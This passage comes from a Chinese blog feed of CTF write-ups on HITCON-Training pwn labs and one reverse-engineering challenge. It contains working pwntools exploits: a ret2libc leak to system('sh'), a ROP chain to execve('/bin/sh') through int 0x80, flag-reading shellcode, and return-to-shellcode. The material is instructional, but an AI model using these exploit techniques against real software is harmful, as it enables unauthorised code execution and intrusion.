0xf75d2000</strong></p><p>这里我只是简单的展示一下计算方法，实际上在程序运行过程中libc的<strong>基地址是会发生变化的</strong>，所以不能提前计算好基地址，再写exp，要在exp里面计算基地址，这样就不会出错。</p><p>既然已经可以计算出system函数的地址了，那么我们就需要找一个sh，可以寻找binary程序本身中的字符串，也可以使用libc中的：</p><p><img src="https://i.loli.net/2018/10/24/5bd012dbb4bb5.png" alt=""></p><p>然后我们可以通过Print_message()函数溢出，覆盖EIP的值使其跳转执行system函数：</p><p><img src="https://i.loli.net/2018/10/24/5bd017ba13b3e.png" alt=""></p><p><img src="https://i.loli.net/2018/10/24/5bd018a67369c.png" alt=""></p><p>可以看到padding长度为60，接下来写exp即可.</p></blockquote><h3 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h3><blockquote><p>libcbase_addr = puts_addr - libc_puts</p><p>system_addr = libcbase_addr + libc.symbols[‘system’]</p><p>return_addr = ‘anything’</p><p>exp:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2lib"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ret2lib"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>libc_puts <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">" : "</span><span class="token punctuation">)</span>libcbase_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc_putsreturn_addr <span class="token operator">=</span> <span class="token number">0x0804857D</span> <span class="token comment" spellcheck="true">#main函数地址</span>success<span class="token punctuation">(</span><span class="token string">"libcbase_addr -> {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libcbase_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libcbase_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">,</span> system_addr<span class="token punctuation">,</span> return_addr<span class="token punctuation">,</span> next<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh\x00是因为可能匹配到其他字符串，从而加个截断</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>运行效果：</p><p><img src="https://i.loli.net/2018/10/24/5bd01b3e9b344.png" alt=""></p><h2 id="lab5-simplerop"><a href="#lab5-simplerop" class="headerlink" title="lab5-simplerop"></a>lab5-simplerop</h2><blockquote><p>simplerop ==&gt; easyrop ==&gt; babyrop?经历绝望的过程😭，又是一个构造ropchain的题目。</p></blockquote><h3 id="检查保护措施-1"><a href="#检查保护措施-1" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p><code>checksec ./simplerop</code></p><p><img src="https://i.loli.net/2018/10/24/5bd02cfbed61f.png" alt=""></p><p>开启了NX，栈不可执行防护。</p></blockquote><h3 id="逻辑分析-1"><a href="#逻辑分析-1" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>通过ida看看：</p><p><img src="https://i.loli.net/2018/10/24/5bd037bdc39d0.png" alt=""></p><p>逻辑十分简单，就溢出然后构造rop chain，通过gdb动态调试得到溢出点，padding为32：</p><p><img src="https://i.loli.net/2018/10/24/5bd0380835b4e.png" alt=""></p><p>但是这个题型貌似叫：<code>ret2systemcall</code>，此程序中既无system函数，也无/bin/sh字符串，还是静态编译，新姿势 ==&gt;rop chain后 int 0x80中断从而执行系统调用==&gt; <code>execve(/bin/sh)</code>。</p><p><strong>原理：通过一系列 pop|ret 等gadget，使得 eax = 0xb（execve 32 位下的系统调用号），ebx -&gt; /bin/sh， ecx = edx = 0，然后通过 <code>int 0x80</code> 实现系统调用，执行 execve(“/bin/sh”, 0, 0)</strong></p><p><img src="https://i.loli.net/2018/10/24/5bd03efc07ec3.png" alt=""></p></blockquote><p>不知道为啥我的ROPgadget查不到我们想要的gadget。</p><h3 id="构造exp-1"><a href="#构造exp-1" class="headerlink" title="构造exp"></a>构造exp</h3><blockquote><p>exp:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>  p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./simplerop'</span><span class="token punctuation">)</span>  elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./simplerop'</span><span class="token punctuation">)</span>  pop_edx_ecx_ebx <span class="token operator">=</span> <span class="token number">0x0806eca0</span>  pop_eax <span class="token operator">=</span> <span class="token number">0x080b7e26</span>  pop_edx <span class="token operator">=</span> <span class="token number">0x0806ec7a</span>  int_80 <span class="token operator">=</span> <span class="token number">0x0806c8f5</span>  gadget <span class="token operator">=</span> <span class="token number">0x080707b9</span> <span class="token comment" spellcheck="true"># mov word ptr [edx],eax  </span>bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>  read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>  p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>  payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">32</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_edx<span class="token punctuation">)</span> <span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">"/bin"</span><span class="token operator">+</span> p32<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span>  payload <span class="token operator">+=</span>  p32<span class="token punctuation">(</span>pop_edx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/sh\x00"</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span>  payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edx_ecx_ebx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span>  payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>int_80<span class="token punctuation">)</span>  p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>运行效果：</p><p><img src="https://i.loli.net/2018/10/24/5bd043f350073.png" alt=""></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>内容涉及: libc泄露，leak libc基地址，ropchain系统调用（int 0x80）。</p><p>ropchain系统调用原理：在无system函数，/bin/sh可用的情况下，通过一系列 pop|ret 等gadget，使得 eax = 0xb（execve 32 位下的系统调用号），ebx -&gt; /bin/sh， ecx = edx = 0，然后通过 <code>int 0x80</code> 实现系统调用，执行 execve(“/bin/sh”, 0, 0)。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-10月24-hitcon-二&quot;&gt;&lt;a href=&quot;#Pwn-10月24-hitcon-二&quot; class=&quot;headerlink&quot; title=&quot;Pwn-10月24-hitcon(二)&quot;&gt;&lt;/a&gt;Pwn-10月24-hitcon(二
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="二进制安全" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-10月23-Hitcon(一)</title>
    <link href="http://www.yof3ng.xyz/2018/10/23/Pwn-10%E6%9C%8823/"/>
    <id>http://www.yof3ng.xyz/2018/10/23/Pwn-10月23/</id>
    <published>2018-10-23T10:52:55.000Z</published>
    <updated>2018-10-23T14:25:36.272Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10月23-Hitcon-一"><a href="#Pwn-10月23-Hitcon-一" class="headerlink" title="Pwn-10月23-Hitcon(一)"></a>Pwn-10月23-Hitcon(一)</h1><blockquote><p>继续二进制修炼，今天开始肝Hiton-training，膜着<a href="https://m4x.fun/post/hitcon-training-writeup/" target="_blank" rel="noopener">m4x</a>，以及另一位大佬<a href="https://www.jianshu.com/p/2cae38284bff" target="_blank" rel="noopener">23R3F</a>的题解蹒跚前行。</p></blockquote><h2 id="lab1-sysmagic"><a href="#lab1-sysmagic" class="headerlink" title="lab1-sysmagic"></a>lab1-sysmagic</h2><blockquote><p>貌似第一题会比较简单，先用IDA-Pro静态分析一下：</p><p><img src="https://i.loli.net/2018/10/23/5bcf0b64c261c.png" alt=""></p><p>貌似直接得到了一个能够输出flag的函数？由于这是个elf32位可执行文件所以我们需要在linux下面执行：</p><p><img src="https://i.loli.net/2018/10/23/5bcf0332abc98.png" alt=""></p><p>可以很简单就看懂逻辑，输入一个值，然后比较如果相等，得出flag。</p></blockquote><h3 id="解法1-patch"><a href="#解法1-patch" class="headerlink" title="解法1 - patch"></a>解法1 - patch</h3><blockquote><p>IDA Pro – keypatch，使用<code>keypatch</code>插件来修改汇编代码，我们可以直接将关键的一步nop掉或者改成完全相反的操作。</p></blockquote><p><img src="https://i.loli.net/2018/10/23/5bcf05f6b8d06.png" alt=""></p><blockquote><p>例如将<code>.text:08048722</code>的跳转汇编指令改为jmp无条件跳转，或者是与jnz相反的jz操作。</p><p><img src="https://i.loli.net/2018/10/23/5bcf075963ea4.png" alt=""></p><p><img src="https://i.loli.net/2018/10/23/5bcf07b5548dc.png" alt=""></p><p>修改为无条件跳转后需要将其保存到对应文件中：<br><img src="https://i.loli.net/2018/10/23/5bcf07f4c58d9.png" alt=""></p><p>然后去把文件挪到linux上运行试试发现并没有用，因为改为jmp后其函数直接少了一部分对flag的操作：</p><p><img src="https://i.loli.net/2018/10/23/5bcf0a2f45481.png" alt=""></p><p>所以我们只能将原样本中的jnz改为jz了，改完之后函数已经成为不等则输出flag了：</p><p><img src="https://i.loli.net/2018/10/23/5bcf0bd4dce1d.png" alt=""></p><p>运行效果：</p><p><img src="https://i.loli.net/2018/10/23/5bcf0c1461b1f.png" alt=""></p></blockquote><h3 id="解法2-gdb-set-register-value"><a href="#解法2-gdb-set-register-value" class="headerlink" title="解法2 - gdb set register value"></a>解法2 - gdb set register value</h3><blockquote><p>通过gdb动态调试，并且在即将进行比较前，将 eax置为与edx相同的值即可：</p><p><img src="https://i.loli.net/2018/10/23/5bcf0e78806d2.png" alt=""></p><p>然后即可得到flag。</p></blockquote><h2 id="lab2-orw"><a href="#lab2-orw" class="headerlink" title="lab2-orw"></a>lab2-orw</h2><h3 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p><code>checksec orw.bin</code>，题目orw的意思是open，read，write这三个函数。</p><p><img src="https://i.loli.net/2018/10/23/5bcf0fca60256.png" alt=""></p><p>emmm这是我做的第一个开启了Stack保护的题目呢。</p></blockquote><h3 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>简单跑一下可以看到直接是让你输入shellcode：<br><img src="https://i.loli.net/2018/10/23/5bcf104eea350.png" alt=""></p><p>放IDA pro里面看看：</p><p><img src="https://i.loli.net/2018/10/23/5bcf15e2dd0aa.png" alt=""></p><p>细看一下<code>orw_seccomp()函数</code>:</p><p><img src="https://i.loli.net/2018/10/23/5bcf16ed762fb.png" alt=""></p><p>prctl函数又是啥玩意儿？Prctl(用户和内核沟通的一个绝佳函数),这个函数可以对进程进行一些设置。<a href="https://bbs.pediy.com/thread-225488.htm" target="_blank" rel="noopener">而有一道强网杯题目就好像用了这玩意儿的技术？</a></p><p>输入shellcode之后应该会执行，所以这题的目的是让我们自己构造shellcode去读取flag？既然要构造shellcode，那就需要用到pwntools的asm模块和shellcraft模块：</p><p>asm模块是将操作转换为汇编命令，而shellcraft是具有各种函数对应汇编命令的一个模块，十分好用：</p><p><img src="https://i.loli.net/2018/10/23/5bcf1996469a4.png" alt=""></p><p>pwntools中的context模块又是用来干嘛的呢？</p><p><code>context</code>是pwntools用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。</p><p>例如<code>context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)</code></p><p>这句话的意思是： </p><ol><li>os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux </li><li>arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’ </li><li>log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。</li></ol></blockquote><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>根据题意和题解😂（正处于涨姿势的时候）写出exp：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> shellcraft <span class="token keyword">as</span> sccontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>shellcode <span class="token operator">=</span> sc<span class="token punctuation">.</span>pushstr<span class="token punctuation">(</span><span class="token string">"/home/xiaoyifeng/ctf/pwn/Hiton/lab2/flag"</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> sc<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">"esp"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  open返回的文件文件描述符存贮在eax寄存器里 </span>shellcode <span class="token operator">+=</span> sc<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">"eax"</span><span class="token punctuation">,</span> <span class="token string">"esp"</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  open读取的内容放在栈顶 </span><span class="token comment" spellcheck="true">#  write函数在栈顶读取0x100大小的内容并打印出来</span>shellcode <span class="token operator">+=</span> sc<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"esp"</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./orw.bin"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print(asm(shellcode))</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"shellcode:"</span><span class="token punctuation">,</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行效果：</p><p><img src="https://i.loli.net/2018/10/23/5bcf2cbec3db2.png" alt=""></p><h2 id="lab3-ret2sc"><a href="#lab3-ret2sc" class="headerlink" title="lab3-ret2sc"></a>lab3-ret2sc</h2><blockquote><p>题目名是return to shellcode的简写，应该是利用return返回然后执行shellcode之类的操作？</p></blockquote><h3 id="检查保护措施-1"><a href="#检查保护措施-1" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p><code>checksec ret2sc</code></p><p><img src="https://i.loli.net/2018/10/23/5bcf21774fa88.png" alt=""></p><p>emmm没有开启啥保护，没有开启栈溢出检测，也没有开启栈不可执行（NX）。</p></blockquote><h3 id="逻辑分析-1"><a href="#逻辑分析-1" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>跑一下发现让我们输入字符串到Name里面，还有一个try your best？首先想到的是会不会又是啥栈溢出什么的。</p></blockquote><blockquote><p> <img src="https://i.loli.net/2018/10/23/5bcf212fdd23f.png" alt=""></p></blockquote><blockquote><p>嗯，情况是有的：</p><p><img src="https://i.loli.net/2018/10/23/5bcf22016964b.png" alt=""></p><p>通过gdb动态调试可以发现在输入try your best 的值的时候可以发生溢出，并且将EIP指向我们构造的位置：</p><p><img src="https://i.loli.net/2018/10/23/5bcf25189cf77.png" alt=""></p><p>而这个临界值我们可以通过pattern search来查我们构造的pattern偏移量，得到为32。根据大佬的题解了解到return to shellcode是一种题型，我甚至想到了又用ROP chain???<code>黑人问号.jpg</code>😭。</p><p>原来return to shellcode的操作就是将shellcode写入name变量空间，然后通过返回到该地址从而执行shellcode(NX未开启，栈可执行)</p><p><img src="https://i.loli.net/2018/10/23/5bcf2a86e5630.png" alt=""></p><p>该变量地址为0x804A060</p></blockquote><h3 id="构造EXP"><a href="#构造EXP" class="headerlink" title="构造EXP"></a>构造EXP</h3><blockquote><p>这个exp需要用到shellcraft和asm，来将shellcode转为汇编指令：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">"linux"</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">"i386"</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2sc"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#获得sh的命令多种多样，并且有不同系统版本的sh</span><span class="token comment" spellcheck="true">#shellcode = asm(shellcraft.execve("/bin/sh"))</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>i386<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#flat模块能将pattern字符串和地址结合并且转为字节模式</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x804a060</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行效果：</p></blockquote><p><img src="https://i.loli.net/2018/10/23/5bcf2c13d7442.png" alt=""></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>内容涉及 context 模式设置，asm模块，shellcraft模块，patch操作，return to shellcode题型，pwntools flat模块。</p><p>今天先混到这儿。。。我真菜😭。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-10月23-Hitcon-一&quot;&gt;&lt;a href=&quot;#Pwn-10月23-Hitcon-一&quot; class=&quot;headerlink&quot; title=&quot;Pwn-10月23-Hitcon(一)&quot;&gt;&lt;/a&gt;Pwn-10月23-Hitcon(一
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="二进制安全" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Re-10月22-shiyanbar-10000</title>
    <link href="http://www.yof3ng.xyz/2018/10/22/Re-10%E6%9C%8822-shiyanbar-10000/"/>
    <id>http://www.yof3ng.xyz/2018/10/22/Re-10月22-shiyanbar-10000/</id>
    <published>2018-10-22T06:23:30.000Z</published>
    <updated>2018-10-22T08:58:01.248Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Re-10月22-shiyanbar-10000"><a href="#Re-10月22-shiyanbar-10000" class="headerlink" title="Re-10月22-shiyanbar-10000"></a>Re-10月22-shiyanbar-10000</h1><blockquote><p>emmm记录一下实验吧里一道简单的逆向，实际上就是一种思维方式。</p></blockquote><blockquote><p>拿到一个exe文件,运行效果如下：</p><p><img src="https://i.loli.net/2018/10/22/5bcd6ebe22927.png" alt=""></p><p>对没错就是一个喵字，然后输入内容，会输出wrong，可以猜测输入了正确的字符后会输出good。</p></blockquote><h2 id="静态分析程序逻辑"><a href="#静态分析程序逻辑" class="headerlink" title="静态分析程序逻辑"></a>静态分析程序逻辑</h2><blockquote><p>令人绝望的是，ida6.8和ida7.0对此程序main函数分析的伪代码居然不同，这里我们看7.0的：</p><p><img src="https://i.loli.net/2018/10/22/5bcd72ad9ac34.png" alt=""></p><p>简单分析可以知道，这里是将我们的输入按字节与0x80u进行或操作，即按位或，然后对处理后的内容进行字符串比较，然后得出结果。上图中的v4到v16实际上都是下图中的16进制转为整型的内容，因为一个字节可以表示的数字范围为-128到127。</p><p><img src="https://i.loli.net/2018/10/22/5bcd71a486530.png" alt=""></p><p>然后我就要傻逼😭地说，这些内容肯定跟比较是有关系的。</p><p>试试将0xe6与0x80</p><p>我们注意到<code>.text:004013F8</code>位置的命令是将eax与0xFFFFFF80相或，为啥我们的伪代码中却是与0x80u相或呢？因为我们是按字节来进行或操作，所以0xFFFFFF80前面的三个字节也就没有了必要。</p><p>唉实在是这题目逻辑太含糊不清（可能是我太菜┭┮﹏┭┮）</p></blockquote><h2 id="动态程序逻辑分析"><a href="#动态程序逻辑分析" class="headerlink" title="动态程序逻辑分析"></a>动态程序逻辑分析</h2><blockquote><p>通过ollydbg我们来进行动态调试，首先载入程序，查找字符串：</p><p><img src="https://i.loli.net/2018/10/22/5bcd7825508d0.png" alt=""></p><p>然后我们找一下”喵”，出现的位置，并且在找到的字符串比较函数下断点：</p><p><img src="https://i.loli.net/2018/10/22/5bcd78b3669b0.png" alt=""></p><p>然后运行，并且随便输入一个字符串：</p><p><img src="https://i.loli.net/2018/10/22/5bcd790b40671.png" alt=""></p><p>栈中出现了两个字符串比较的数据，在数据窗口跟随，可以发现s2为13个字节，正好对应前面的那13个数据</p><p><img src="https://i.loli.net/2018/10/22/5bcd79f764ec2.png" alt=""></p><p>但是光靠这些信息我们能拿到我们想要的答案吗？我们可以对s1进行一些操作，之前输入的字符串为<code>helloword 或操作处理后==&gt; E8 E5 EC EC EF F7 EF F2 E4</code>。我看网上很多教程是直接通过异或，将s2异或0x80得到结果（脑洞？？）</p><p><img src="https://i.loli.net/2018/10/22/5bcd7e34f2571.png" alt=""></p><p>一个字节的情况下，可能通过异或操作并且根据已知条件能够得到或操作的原操作数，但是我可能太菜了不求甚解，只能写个脚本枚举一下flag好了（根据ida根本难以看出来好不好😭还是太菜了不能怪ida)。</p></blockquote><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token comment" spellcheck="true">#</span>__Author__ <span class="token operator">=</span><span class="token string">"Yof3ng"</span>lists <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xE6</span><span class="token punctuation">,</span><span class="token number">0xEC</span><span class="token punctuation">,</span><span class="token number">0xE1</span><span class="token punctuation">,</span><span class="token number">0xE7</span><span class="token punctuation">,</span><span class="token number">0xBA</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">,</span><span class="token number">0xE5</span><span class="token punctuation">,</span><span class="token number">0xF3</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">,</span><span class="token number">0xE5</span><span class="token punctuation">,</span><span class="token number">0xF3</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">]</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> a <span class="token keyword">in</span> lists<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">|</span><span class="token number">0x80</span><span class="token operator">==</span>a<span class="token punctuation">:</span>            flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre></blockquote><p>运行效果：</p><p><img src="https://i.loli.net/2018/10/22/5bcd7ed7225ae.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Re-10月22-shiyanbar-10000&quot;&gt;&lt;a href=&quot;#Re-10月22-shiyanbar-10000&quot; class=&quot;headerlink&quot; title=&quot;Re-10月22-shiyanbar-10000&quot;&gt;&lt;/a&gt;R
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="二进制安全" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="RE" scheme="http://www.yof3ng.xyz/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-10月21-jarvis-level0</title>
    <link href="http://www.yof3ng.xyz/2018/10/21/Pwn-10%E6%9C%8821-jarvis-level0/"/>
    <id>http://www.yof3ng.xyz/2018/10/21/Pwn-10月21-jarvis-level0/</id>
    <published>2018-10-21T01:01:10.000Z</published>
    <updated>2018-10-21T01:54:26.067Z</updated>
    
